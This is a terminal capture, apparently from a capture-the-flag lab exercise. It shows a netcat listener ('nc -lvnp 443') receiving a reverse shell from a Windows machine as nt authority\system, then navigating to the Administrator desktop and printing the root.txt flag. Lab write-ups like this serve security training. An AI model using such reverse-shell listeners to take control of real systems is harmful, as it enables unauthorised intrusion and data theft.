
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.114.253] 49365
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\Users
cd c:\Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users

09/26/2019  11:29 PM    <DIR>          .
09/26/2019  11:29 PM    <DIR>          ..
09/26/2019  07:11 AM    <DIR>          Administrator
09/27/2019  09:09 AM    <DIR>          bill
04/22/2024  01:56 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  44,155,191,296 bytes free

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\Administrator

09/26/2019  07:11 AM    <DIR>          .
09/26/2019  07:11 AM    <DIR>          ..
09/26/2019  07:11 AM    <DIR>          Contacts
10/12/2020  12:05 PM    <DIR>          Desktop
09/26/2019  07:11 AM    <DIR>          Documents
09/27/2019  07:57 AM    <DIR>          Downloads
09/26/2019  07:11 AM    <DIR>          Favorites
09/26/2019  07:11 AM    <DIR>          Links
09/26/2019  07:11 AM    <DIR>          Music
09/26/2019  07:11 AM    <DIR>          Pictures
09/26/2019  07:11 AM    <DIR>          Saved Games
09/26/2019  07:11 AM    <DIR>          Searches
09/26/2019  07:11 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  44,155,191,296 bytes free

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,155,191,296 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
c:\Users\Administrator\Desktop>
```